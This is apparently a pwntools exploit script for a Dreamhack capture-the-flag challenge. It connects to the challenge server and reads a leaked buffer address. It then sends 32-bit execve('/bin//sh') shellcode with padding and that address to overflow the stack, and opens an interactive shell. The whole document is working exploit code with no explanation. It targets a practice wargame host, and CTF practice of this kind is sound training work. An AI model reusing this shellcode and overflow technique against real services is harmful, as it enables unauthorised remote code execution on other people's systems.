from pwn import *

p = remote("host1.dreamhack.games", 11326)
p.recvuntil("buf =(")
addr = int(p.recv(10), 16)
p.recvline()

pay = "\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x31\xc9\x31\xd2\xb0\x08\x40\x40\x40\xcd\x80"
pay += "\x80"*106
pay += p32(addr)

p.sendline(pay)
p.interactive()